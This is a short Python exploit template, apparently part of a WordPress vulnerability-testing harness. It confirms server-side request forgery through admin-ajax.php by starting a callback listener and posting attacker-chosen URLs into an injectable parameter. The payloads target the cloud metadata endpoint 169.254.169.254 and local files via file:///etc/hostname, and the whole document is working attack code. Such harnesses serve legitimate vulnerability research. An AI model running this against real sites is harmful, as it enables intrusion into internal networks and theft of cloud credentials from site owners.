import http.server
import socket
import threading
import time
import requests

TARGET = "{{ target_url }}"
ACTION = "{{ ajax_action }}"
PARAM  = "{{ injectable_param }}"

# Spin a tiny HTTP listener on the host loopback. If the target fetches it,
# the SSRF is confirmed end-to-end.
HITS: list[tuple[str, str]] = []

class _H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        HITS.append((self.client_address[0], self.path))
        self.send_response(200); self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a, **k): pass

def _free_port() -> int:
    s = socket.socket()
    s.bind(("0.0.0.0", 0))
    p = s.getsockname()[1]; s.close()
    return p

LISTEN_PORT = _free_port()
server = http.server.HTTPServer(("0.0.0.0", LISTEN_PORT), _H)
threading.Thread(target=server.serve_forever, daemon=True).start()

# host.docker.internal is reachable from a Docker container on Mac/Win.
CALLBACK_URLS = [
    f"http://host.docker.internal:{LISTEN_PORT}/wpvh_ssrf",
    f"http://172.17.0.1:{LISTEN_PORT}/wpvh_ssrf",
    f"http://169.254.169.254/latest/meta-data/",  # cloud metadata, harmless if no provider
    f"file:///etc/hostname",
]

print(f"[*] Listener up on :{LISTEN_PORT}; testing SSRF action={ACTION} param={PARAM}")
for url in CALLBACK_URLS:
    requests.post(
        f"{TARGET}/wp-admin/admin-ajax.php",
        data={"action": ACTION, PARAM: url},
        timeout=30,
    )

time.sleep(2)
server.shutdown()

if HITS:
    print(f"[+] SUCCESS: target fetched our listener — hits={HITS}")
else:
    print("[!] FAILURE: no callback hits — SSRF not confirmed via our listener")
